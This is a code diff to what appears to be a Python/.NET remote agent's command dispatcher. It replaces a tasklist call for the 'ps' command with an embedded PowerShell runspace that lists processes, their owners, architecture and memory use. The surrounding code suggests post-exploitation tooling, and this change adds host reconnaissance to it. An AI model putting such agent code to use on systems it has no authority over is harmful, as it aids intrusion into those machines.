@@ -12,7 +12,6 @@ import threading
 import http.server
 import zipfile
 import io
-import importlib.util
 import types
 import re
 import shutil
@@ -23,9 +22,11 @@ import numbers
 from os.path import expanduser
 from io import StringIO
 from threading import Thread
-import platform
 from System import Environment
+import clr, System
 
+clr.AddReference("System.Management.Automation")
+from System.Management.Automation import Runspaces
 
 ################################################
 #
@@ -1006,7 +1007,45 @@ def run_command(command, cmdargs=None):
         return str(socket.gethostname())
 
     elif re.compile("ps").match(command):
-        return os.popen('tasklist').read()
+        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
+        myrunspace.Open()
+        pipeline = myrunspace.CreatePipeline()
+        pipeline.Commands.AddScript("""
+           $owners = @{};
+           Get-WmiObject win32_process | ForEach-Object {$o = $_.getowner(); if(-not $($o.User)) {$o='N/A'} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+           $p = '*';
+           $output = Get-Process $p | ForEach-Object {
+               $arch = 'x64';
+               if ([System.IntPtr]::Size -eq 4) {
+                   $arch = 'x86';
+               }
+               else{
+                   foreach($module in $_.modules) {
+                       if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
+                           $arch = 'x86';
+                           break;
+                       }
+                   }
+               }
+               $out = New-Object psobject;
+               $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
+               $out | Add-Member Noteproperty 'PID' $_.ID;
+               $out | Add-Member Noteproperty 'Arch' $arch;
+               $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
+               $mem = "{0:N2} MB" -f $($_.WS/1MB);
+               $out | Add-Member Noteproperty 'MemUsage' $mem;
+               $out;
+           } | Sort-Object -Property PID;
+           $output | Format-Table -wrap | Out-String;
+        """)
+        results = pipeline.Invoke()
+        buffer = StringIO()
+        sys.stdout = buffer
+        for result in results:
+            print(result)
+        sys.stdout = sys.__stdout__
+        return_data = buffer.getvalue()
+        return return_data
     else:
         if cmdargs is None:
             cmdargs = ''
